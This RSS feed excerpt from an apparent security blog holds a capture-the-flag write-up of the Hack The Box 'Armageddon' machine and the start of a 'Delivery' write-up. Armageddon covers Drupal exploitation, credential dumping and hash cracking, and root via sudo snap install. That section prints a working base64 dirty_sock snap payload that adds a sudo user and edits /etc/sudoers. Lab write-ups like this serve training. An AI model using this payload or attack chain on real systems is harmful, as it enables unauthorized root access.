      <description>&lt;p&gt;Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).&lt;/p&gt;
&lt;h2 id=&#34;enumeration&#34; &gt;Enumeration
&lt;span&gt;
    &lt;a href=&#34;#enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;We start of with an intense full port scan with nmap.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Increasing send delay &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; 10.129.100.170 from &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0&lt;/span&gt; to &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;5&lt;/span&gt; due to &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;55&lt;/span&gt; out of &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;183&lt;/span&gt; dropped probes since last increase.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: 10.129.100.170 giving up on port because retransmission cap hit (10).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Increasing send delay &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; 10.129.100.170 from &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;640&lt;/span&gt; to &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1000&lt;/span&gt; due to &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;110&lt;/span&gt; out of &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;366&lt;/span&gt; dropped probes since last increase.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; armageddon.htb (10.129.100.170)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up (0.098s latency).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;40576&lt;/span&gt; closed ports, &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;24958&lt;/span&gt; filtered ports
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Then we run another nmap scan to identify what version/service ports are running on.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; armageddon.htb (10.129.100.170)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up (0.070s latency).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-generator: Drupal &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;7&lt;/span&gt; (http://drupal.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-robots.txt: &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;36&lt;/span&gt; disallowed entries (&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;15&lt;/span&gt; shown)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /includes/ /misc/ /modules/ /profiles/ /scripts/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_/LICENSE.txt /MAINTAINERS.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Welcome to  Armageddon |  Armageddon
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE&amp;rsquo;s Exploits .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/exploits.png&#34; alt=&#34;searchsploit_exploits&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;foothold&#34; &gt;Foothold
&lt;span&gt;
    &lt;a href=&#34;#foothold&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Checking Exploits that &lt;strong&gt;searchploit&lt;/strong&gt; showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running &lt;strong&gt;Metasploit&lt;/strong&gt; to launch the exploit.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/metasploit1.png&#34; alt=&#34;metasploit1&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;After Few Moments.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/msf_worked.png&#34; alt=&#34;msf_worked1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;user-enumeration&#34; &gt;User Enumeration
&lt;span&gt;
    &lt;a href=&#34;#user-enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/no_tty.png&#34; alt=&#34;no_revshell&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This concludes that the there&amp;rsquo;s some sort of firewall blocking it or there&amp;rsquo;s restrictions that don&amp;rsquo;t allow such outcoming connections like sandboxed programs in this case apache?.&lt;/li&gt;
&lt;li&gt;However there&amp;rsquo;s an allowed connection at port 4444&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/rev_shell.png&#34; alt=&#34;rev_shell&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/sandboxed.png&#34; alt=&#34;sandboxed_box&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s get &lt;strong&gt;linpeas&lt;/strong&gt; and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/linpeas.png&#34; alt=&#34;linpeas_start&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linpeas did find drupal Mysql password&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/linpeas2.png&#34; alt=&#34;finding_mysql_creds&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/creds_mysql.png&#34; alt=&#34;creds_mysql&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sweet , now let&amp;rsquo;s connect to mysql and dump what juicy stuff it holds .&lt;/li&gt;
&lt;li&gt;Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/mysql_dump.png&#34; alt=&#34;mysql_dump&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;now i can just download it and cat it or import it to my own mysql server.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/dump_view.png&#34; alt=&#34;dump_view&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we can see that&amp;rsquo;s there&amp;rsquo;s the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt; which is a local user , let&amp;rsquo;s crack its hash and try to ssh with it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/crack_hash.png&#34; alt=&#34;brute_pass_crack&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Great it&amp;rsquo;s cracked , Now let&amp;rsquo;s try to ssh into &lt;strong&gt;Bruce&lt;/strong&gt; and read the &lt;strong&gt;user.txt&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/get_user.png&#34; alt=&#34;get_user&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
&lt;span&gt;
    &lt;a href=&#34;#privilege-escalation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;initial-recon&#34; &gt;Initial Recon
&lt;span&gt;
    &lt;a href=&#34;#initial-recon&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;After we got into user &lt;strong&gt;bruce&lt;/strong&gt; let&amp;rsquo;s see if he has any sudo permissions,terms whatever .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/sudo_int.png&#34; alt=&#34;sudo_terms&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Looks like he (&lt;strong&gt;bruce&lt;/strong&gt;) can install snap packages , This is really interesting .&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Let&amp;rsquo;s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to &amp;hellip;. , there&amp;rsquo;s alot of way tho.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;There&amp;rsquo;s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don&amp;rsquo;t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;So In Order To Create a snap package i had to install an ubuntu vm cuz i&amp;rsquo;m running arch based os, so i cheated a bit and i didn&amp;rsquo;t want to run a vm so i used a prepacked snaps from those exploits &lt;a href=&#34;https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;i decoded the base64 and wrote it to a file using python&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;import&lt;/span&gt; base64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload = (&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt; + &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; * &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;4256&lt;/span&gt; + &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;==&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d = base64.b64decode(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;crafted.snap&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;).write(d)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Then downloaded the file and installed it .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/inst_run.png&#34; alt=&#34;inst_run&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Now let&amp;rsquo;s su to the dirty_sock user we added to /etc/passwd and read the root flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/read_root.png&#34; alt=&#34;read_root&#34;&gt;&lt;/p&gt;
&lt;p&gt;And That&amp;rsquo;s it , that&amp;rsquo;s &lt;strong&gt;Armageddon&lt;/strong&gt; hope you enjoyed the writeup take care and i&amp;rsquo;ll see you all other time.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>HTB - Delivery</title>
      <link>https://ybenel.cf/post/htb-delivery/</link>
      <pubDate>Sun, 10 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ybenel.cf/post/htb-delivery/</guid>
      <description>&lt;p&gt;Delivery Easy Box By Ippsec&lt;/p&gt;
&lt;h2 id=&#34;foothold&#34; &gt;Foothold
&lt;span&gt;
    &lt;a href=&#34;#foothold&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;enumeration&#34; &gt;Enumeration
&lt;span&gt;
    &lt;a href=&#34;#enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;We start of with the nmap , nmap -sC -sV -p- -T4 -oN delivery.nmap delivery.htb
We can see there&amp;rsquo;s 3 ports open.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic30.png&#34; alt=&#34;nmap&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s browse http and see what&amp;rsquo;s there.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic0.png&#34; alt=&#34;Static&#34;&gt;&lt;/p&gt;
&lt;p&gt;We get a static website, looking at the site source there&amp;rsquo;s nothing much there but look around contact us we get this .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic26.png&#34; alt=&#34;Static_Contact&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see a note from the site owner?&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you&amp;#39;ll be able to have access to our MatterMost server
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;so let&amp;rsquo;s look at the helpdisk at helpdesk.delivery.htb&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic29.png&#34; alt=&#34;helpdisk&#34;&gt;&lt;/p&gt;
&lt;p&gt;We see osticket support center,right of the top we check for any cves but they are all old and not affective so let&amp;rsquo;s create a new account .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic24.png&#34; alt=&#34;helpdisk_signup&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now After we created an account we get account verification but thinking logically we have entered a none existing email we cannot receive emails neither do anything.
Hmmm there must be somewhere around it . let&amp;rsquo;s check the open ticket thing .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic9.png&#34; alt=&#34;helpdisk_ticket_open&#34;&gt;&lt;/p&gt;
&lt;p&gt;let&amp;rsquo;s fill those real quick .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic22.png&#34; alt=&#34;helpdisk_ticket_fill&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic25.png&#34; alt=&#34;helpdisk_ticket_fill2&#34;&gt;&lt;/p&gt;
